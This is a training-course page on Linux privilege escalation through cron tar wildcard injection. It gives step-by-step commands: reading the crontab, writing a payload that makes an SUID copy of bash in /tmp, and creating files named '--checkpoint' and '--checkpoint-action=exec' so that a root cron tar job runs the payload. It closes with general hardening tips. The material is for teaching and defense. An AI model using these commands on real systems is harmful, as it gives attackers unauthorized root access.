# 🛡️ Cron Wildcards

> **Course Track:** [Linux Privilege Escalation](../../README.md)  
> **Module:** [Scheduled tasks](./README.md)  
> **Topic Path:** `Linux Privilege Escalation > Scheduled tasks > Cron Wildcards`

---

## 🎯 Technical Overview & Objectives
This section covers the methodology, enumeration techniques, exploit mechanics, and defensive mitigations for **Cron Wildcards**.

---

## 🔬 Practical Notes, Commands & Proof of Exploit


This can be utilized outside the cron as well

So here check the crontab

```bash
cat /etc/crontab
```

We find this


![Privilege Escalation Proof Screenshot](./assets/026_Cron_Wildcards_1d6d64c5-e0cb-8011-b913-d5546ea7923f.png)
*Figure: Privilege Escalation Proof Screenshot*


So we check what it is actually doing

```bash
cat /usr/local/bin/compress.sh
```

We see that there is a tar file with a wildcard. We also check our permissions 

```bash
ls -la /usr/local/bin/compress.sh
```


![Privilege Escalation Proof Screenshot](./assets/027_Cron_Wildcards_1d6d64c5-e0cb-8007-a4ab-e273c92f68df.png)
*Figure: Privilege Escalation Proof Screenshot*


Then we write an exploit

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
```

Then we make it fully executable

```bash
chmod +x runme.sh
```

Now we will be running some tar commands (since the file is of tar)

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```


![Privilege Escalation Proof Screenshot](./assets/028_Cron_Wildcards_1d6d64c5-e0cb-8062-a0e1-d42e45699f6a.png)
*Figure: Privilege Escalation Proof Screenshot*


So basically what is happening is, the wild card is taking the —checkpoint=1 and appending it to it and then when it appends, it carries out an action cause of the other statement and runs the executable runme.sh file and we get root access



---

## 🛡️ Defensive Hardening & Remediation
- **Audit & Restrict Permissions:** Review `/etc/sudoers`, remove unnecessary SUID/SGID flags (`chmod u-s`), and enforce strict file ownership on configuration files.
- **Kernel Patching:** Regularly apply distribution security updates to mitigate known local privilege escalation (LPE) vulnerabilities.
- **Principle of Least Privilege:** Avoid running non-administrative daemon processes as `root` and isolate services using containers/namespaces.

---
[⬅ Back to Scheduled tasks](./README.md) • [🏠 Master Course Index](../README.md)
